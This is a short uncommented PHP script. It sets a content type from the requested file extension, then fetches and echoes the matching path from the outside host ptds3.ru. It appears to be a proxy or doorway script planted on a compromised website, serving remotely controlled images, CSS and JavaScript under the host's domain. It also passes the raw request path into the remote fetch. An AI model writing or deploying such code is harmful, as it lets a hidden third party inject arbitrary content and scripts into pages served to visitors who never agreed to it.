<?
$some = str_replace('.php', '', $_SERVER['SCRIPT_NAME']);
$some = str_replace($some, '', $_SERVER['REQUEST_URI']);
$exte=explode(".", $some);foreach($exte as $extes){$ext=$extes;}
if($ext=='png'){header("Content-type: image/png");}
if($ext=='gif'){header("Content-type: image/gif");}
if($ext=='jpeg'){header("Content-type: image/jpeg");}
if($ext=='jpg'){header("Content-type: image/jpeg");}
if($ext=='jpe'){header("Content-type: image/jpeg");}
if($ext=='css'){header("Content-type: text/css");}
if($ext=='js'){header("Content-type: application/javascript");}
echo file_get_contents('http://ptds3.ru/src'.$some);
?>